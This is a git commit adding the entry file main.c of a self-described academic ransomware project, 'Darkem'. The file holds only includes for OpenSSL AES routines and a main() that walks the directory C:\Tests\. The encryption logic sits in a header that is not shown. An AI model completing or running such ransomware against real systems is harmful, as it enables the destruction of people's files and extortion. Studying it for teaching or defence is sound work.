da9d2a8d067c4c0e466e605f020bae9971d9d779
Sanix Darker <sanix000@yahoo.fr>
2017-09-04 23:53:49 +0200

    Initial commit

---
+++ main.c
@@ -0,0 +1,20 @@
+/* Simple RansomWare Darkem(Academic purpose) By Sanix Darker) */
+/* Have Fun, after debuuging intentionnals buggs :-)*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <dirent.h>
+#include <openssl/evp.h>
+#include <openssl/aes.h>
+#include "Darkem.h"
+
+int main()
+{
+	char* start_path;
+	start_path = "C:\\Tests\\";
+    ls_dir(start_path);
+
+    return 0;
+}
